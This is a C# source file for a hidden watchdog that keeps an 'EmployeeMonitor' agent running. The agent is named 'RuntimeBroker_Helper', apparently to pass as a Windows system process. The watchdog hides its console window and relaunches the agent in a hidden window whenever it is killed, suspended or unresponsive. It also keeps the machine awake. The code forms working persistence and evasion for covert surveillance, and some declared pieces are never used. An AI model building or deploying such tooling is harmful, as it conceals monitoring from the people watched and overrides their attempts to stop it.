using System.Diagnostics;
using System.Runtime.InteropServices;

namespace AgentWatchdog;

class Program
{
    // Configuration
    private const string MainAgentProcessName = "RuntimeBroker_Helper";
    private const string MainAgentExePath = @"C:\ProgramData\EmployeeMonitor\RuntimeBroker_Helper.exe";
    private const int CheckIntervalSeconds = 30; // Check more frequently
    private const int MaxSuspendedRestarts = 3;

    // Track restart attempts
    private static int _suspendedRestartCount = 0;
    private static DateTime _lastRestartTime = DateTime.MinValue;

    // Windows API for anti-suspension
    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern uint SetThreadExecutionState(uint esFlags);

    private const uint ES_CONTINUOUS = 0x80000000;
    private const uint ES_SYSTEM_REQUIRED = 0x00000001;
    private const uint ES_AWAYMODE_REQUIRED = 0x00000040;

    // Windows API for checking if process is suspended
    [DllImport("ntdll.dll")]
    private static extern int NtQueryInformationProcess(IntPtr processHandle, int processInformationClass, 
        ref PROCESS_BASIC_INFORMATION processInformation, int processInformationLength, out int returnLength);

    [StructLayout(LayoutKind.Sequential)]
    private struct PROCESS_BASIC_INFORMATION
    {
        public IntPtr Reserved1;
        public IntPtr PebBaseAddress;
        public IntPtr Reserved2_0;
        public IntPtr Reserved2_1;
        public IntPtr UniqueProcessId;
        public IntPtr Reserved3;
    }

    static async Task Main(string[] args)
    {
        // Hide console window
        var handle = GetConsoleWindow();
        if (handle != IntPtr.Zero)
        {
            ShowWindow(handle, SW_HIDE);
        }

        // Set our own priority high
        try
        {
            Process.GetCurrentProcess().PriorityClass = ProcessPriorityClass.AboveNormal;
        }
        catch { }

        Log($"Watchdog started at {DateTime.Now}");
        Log($"Monitoring: {MainAgentProcessName}");
        Log($"Check interval: {CheckIntervalSeconds}s");

        // Main monitoring loop
        while (true)
        {
            try
            {
                // Keep watchdog itself from being suspended
                PreventSuspension();

                await CheckAndRestartAgent();
            }
            catch (Exception ex)
            {
                LogError($"Error in monitoring loop: {ex.Message}");
            }

            await Task.Delay(TimeSpan.FromSeconds(CheckIntervalSeconds));
        }
    }

    static async Task CheckAndRestartAgent()
    {
        var processes = Process.GetProcessesByName(MainAgentProcessName);
        
        if (processes.Length == 0)
        {
            Log($"Agent not running. Attempting to start...");
            await StartAgent();
        }
        else
        {
            // Check if the process is suspended/not responding
            foreach (var proc in processes)
            {
                try
                {
                    bool isSuspended = IsProcessSuspended(proc);
                    bool isResponding = proc.Responding;

                    if (isSuspended || !isResponding)
                    {
                        Log($"Agent appears suspended or not responding (PID: {proc.Id}, Suspended: {isSuspended}, Responding: {isResponding})");
                        
                        // Kill and restart
                        Log($"Killing suspended process...");
                        try
                        {
                            proc.Kill();
                            proc.WaitForExit(5000);
                        }
                        catch (Exception ex)
                        {
                            LogError($"Failed to kill process: {ex.Message}");
                        }

                        _suspendedRestartCount++;
                        
                        // Wait a moment then restart
                        await Task.Delay(2000);
                        await StartAgent();

                        // Reset counter if it's been a while since last restart
                        if ((DateTime.Now - _lastRestartTime).TotalHours > 1)
                        {
                            _suspendedRestartCount = 0;
                        }
                        _lastRestartTime = DateTime.Now;
                    }
                }
                catch (Exception ex)
                {
                    // Process might have exited
                    Log($"Error checking process state: {ex.Message}");
                }
            }
        }

        // Cleanup process handles
        foreach (var p in processes)
        {
            try { p.Dispose(); } catch { }
        }
    }

    static bool IsProcessSuspended(Process process)
    {
        try
        {
            // Method 1: Check thread states
            foreach (ProcessThread thread in process.Threads)
            {
                if (thread.ThreadState == System.Diagnostics.ThreadState.Wait &&
                    thread.WaitReason == ThreadWaitReason.Suspended)
                {
                    return true;
                }
            }

            // Method 2: Try to get CPU time - if we can't, it might be suspended
            try
            {
                var _ = process.TotalProcessorTime;
            }
            catch
            {
                return true; // Can't access, might be suspended
            }

            return false;
        }
        catch
        {
            return false; // Assume not suspended if we can't check
        }
    }

    static async Task StartAgent()
    {
        if (!File.Exists(MainAgentExePath))
        {
            LogError($"Agent executable not found at: {MainAgentExePath}");
            return;
        }

        try
        {
            var psi = new ProcessStartInfo(MainAgentExePath)
            {
                UseShellExecute = true,
                CreateNoWindow = true,
                WindowStyle = ProcessWindowStyle.Hidden
            };
            
            Process.Start(psi);
            Log($"Agent started successfully.");
            
            // Wait a moment and verify it started
            await Task.Delay(3000);
            var checkAgain = Process.GetProcessesByName(MainAgentProcessName);
            if (checkAgain.Length > 0)
            {
                Log($"Agent verified running (PID: {checkAgain[0].Id})");
                
                // Cleanup
                foreach (var p in checkAgain) { try { p.Dispose(); } catch { } }
            }
            else
            {
                LogError($"Agent failed to start after launch attempt.");
            }
        }
        catch (Exception ex)
        {
            LogError($"Failed to start agent: {ex.Message}");
        }
    }

    static void PreventSuspension()
    {
        try
        {
            SetThreadExecutionState(ES_CONTINUOUS | ES_SYSTEM_REQUIRED | ES_AWAYMODE_REQUIRED);
        }
        catch { }
    }

    static void Log(string message)
    {
        var logMessage = $"[{DateTime.Now:yyyy-MM-dd HH:mm:ss}] {message}";
        Console.WriteLine(logMessage);
        
        try
        {
            var logDir = @"C:\ProgramData\EmployeeMonitor\logs";
            Directory.CreateDirectory(logDir);
            
            var logFile = Path.Combine(logDir, "watchdog.log");
            
            // Rotate log if too large (> 5MB)
            if (File.Exists(logFile) && new FileInfo(logFile).Length > 5 * 1024 * 1024)
            {
                var backupFile = Path.Combine(logDir, "watchdog.log.old");
                if (File.Exists(backupFile)) File.Delete(backupFile);
                File.Move(logFile, backupFile);
            }
            
            File.AppendAllText(logFile, logMessage + Environment.NewLine);
        }
        catch { /* Ignore logging errors */ }
    }

    static void LogError(string message)
    {
        Log($"ERROR: {message}");
    }

    // P/Invoke for hiding console
    [DllImport("kernel32.dll")]
    static extern IntPtr GetConsoleWindow();

    [DllImport("user32.dll")]
    static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

    const int SW_HIDE = 0;
}
